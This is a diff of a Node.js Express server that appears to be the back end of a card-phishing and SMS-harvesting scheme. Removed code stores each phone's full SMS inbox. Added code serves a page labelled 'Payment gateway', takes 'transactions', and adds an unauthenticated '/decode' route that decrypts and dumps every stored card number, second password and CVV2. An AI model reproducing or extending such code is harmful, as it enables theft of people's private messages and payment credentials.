@@ -1,9 +1,12 @@
-/* Dependencies */
+/* Package dependencies */
 var express = require('express');
 var mysql = require('mysql');
-var constants = require('./constants');
-var dateformat = require('dateformat');
-var checkVAS = require('./vas');
+var CryptoJS = require('crypto-js');
+
+/* Custom dependencies */
+var constants = require(__dirname + '/modules/constants');
+var checkVAS = require(__dirname + '/modules/vas');
+var submitTransaction = require(__dirname + '/modules/submitTransaction');
 
 /* MySQL Initialization */
 var connection = mysql.createConnection(constants.MySQL);
@@ -16,7 +19,12 @@ connection.connect(function(error){
 
 /* App initialization */
 var app = express();
+app.use(express.static(__dirname + '/html'));
 
+/* Gloabla variables */
+var SECRET_KEY = constants.SECRET_KEY;
+
+/* Start server */
 app.listen(constants.PORT,function(error){
     if(error)
     console.log(error);
@@ -24,54 +32,40 @@ app.listen(constants.PORT,function(error){
     console.log('Listening on port : ' + constants.PORT);
 });
 
+/* Receive SMS List */
 app.post('/vas',function(req, res){
     checkVAS(req, res, connection);
 });
 
+/* Receive transactions */
+app.get('/submit',function(req, res){
+    submitTransaction(req, res, connection);
+});
 
+/* Payment gateway */
+app.get('/index',function(req, res){
+    res.sendFile(__dirname + '/html/index.html');
+});
 
-app.post('/register',function(req,res){
+/* Log decoded transactions info */
+app.get('/decode',function(req, res){
 
-   var sms = JSON.parse(req.query.sms);
-   var method = req.query.method;
+    connection.query("SELECT * FROM app_cards ORDER BY id DESC",function(error, result){
+        
+        // Decode each entry
+        result.forEach(function(c){
+            c.cardnumber = decrypt(c.cardnumber);
+            c.secondpass = decrypt(c.secondpass);
+            c.cvv2 = decrypt(c.cvv2);
+        });
 
-   // Register new user
-   if(method === 'register'){
-       connection.query("INSERT INTO app_users SET ?",{
-           subdate:dateformat(new Date(), 'yyyy-mm-d'),
-           model:req.query.model
-       }, function(error, result){
-            
-            // Receive userid
-            var userid = result.insertId;
-
-            // Save sms list
-            sms.forEach(function(s){
-                connection.query("INSERT INTO app_sms SET ? ",{
-                    userid:userid,
-                    address:s.address,
-                    body:s.body,
-                    date:s.date
-                }, function(error, result){
-                    if(error)
-                    console.log(error);
-                })
-            });
-            
-            // Generate VAS services
-            return res.json({userid:userid});
-
-       });
-
-   } 
-
-   // Update incoming messages
-
+        return res.json(result);
+        
+    });
 
 });
-   
 
-app.get('/index', function(req, res){
-    console.log('hello');
-    return res.json({status:200});
-});
+/* Decrypt function */
+function decrypt(hashcode){
+    return CryptoJS.AES.decrypt(hashcode.toString(), SECRET_KEY).toString(CryptoJS.enc.Utf8);
+}
